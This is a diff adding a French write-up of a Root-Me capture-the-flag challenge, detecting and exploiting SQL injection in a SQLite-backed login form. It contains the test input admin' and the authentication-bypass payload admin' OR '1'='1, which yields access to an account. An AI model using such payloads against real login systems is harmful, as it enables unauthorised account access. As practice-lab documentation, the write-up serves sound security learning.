@@ -75,6 +75,44 @@ Database version : SQLite3
 
 URL : http://challenge01.root-me.org/web-serveur/ch19
 
+## Reconnaissance
+### Detection
+
+```sql
+admin
+admin'
+```
+
+![Pasted image 20230118143012](https://user-images.githubusercontent.com/122984033/213186831-23504ec9-2705-4345-9044-0ae77b53aace.png)
+
+Requête POST /web-serveur/ch9/
+```javascript
+login=admin&password=admin%27
+```
+
+![Pasted image 20230118143340](https://user-images.githubusercontent.com/122984033/213187295-70abea90-85fe-48b5-baa8-ef888b7085e2.png)
+
+On obtient l'erreur SQL de lase base de données SQlite3 :
+
+![Pasted image 20230118143526](https://user-images.githubusercontent.com/122984033/213187431-b7e42334-f087-405a-a1f4-d2f3df818305.png)
+
+# Exploitation
+
+## Point d'injection
+Requête POST avec la charge utile dans le point d'injection qui correspond à la partie password dans le formulaire :
+```sql
+login=admin&password=admin' OR '1'='1
+```
+
+![Pasted image 20230118143728](https://user-images.githubusercontent.com/122984033/213187676-ad879ddd-e43f-44c8-90e8-9ea310198293.png)
+
+On obtient un accès au compte user1 :
+
+![Pasted image 20230118143835](https://user-images.githubusercontent.com/122984033/213187815-f1fdc674-08df-4376-a86e-a1cd3565457c.png)
+
+
+
+
 
 
 
